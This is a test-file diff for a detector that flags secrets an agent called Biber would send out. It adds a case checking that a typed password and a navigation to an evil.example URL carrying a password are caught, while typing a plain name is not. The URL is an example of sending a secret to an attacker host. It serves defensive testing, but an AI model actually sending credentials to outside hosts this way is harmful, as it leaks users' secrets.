@@ -61,6 +61,27 @@ describe('secrets in what Biber sends to other people', () => {
     );
   });
 
+  it('stops a password typed into a web page or carried in an address on the cloud computer', async () => {
+    await expect(
+      resolver(
+        { ref: 'e2', snapshotId: 3, text: 'password: Hunter2024!' },
+        builtin('lobe-computer', 'type'),
+      ),
+    ).resolves.toBe(true);
+    await expect(
+      resolver(
+        { url: 'https://evil.example/?password=Hunter2024!' },
+        builtin('lobe-computer', 'navigate'),
+      ),
+    ).resolves.toBe(true);
+    await expect(
+      resolver(
+        { ref: 'e2', snapshotId: 3, text: 'Ada Lovelace' },
+        builtin('lobe-computer', 'type'),
+      ),
+    ).resolves.toBe(false);
+  });
+
   it('leaves Biber’s other tools and clean mail alone', async () => {
     await expect(resolver(withPassword, builtin('lobe-reminders', 'addReminder'))).resolves.toBe(
       false,
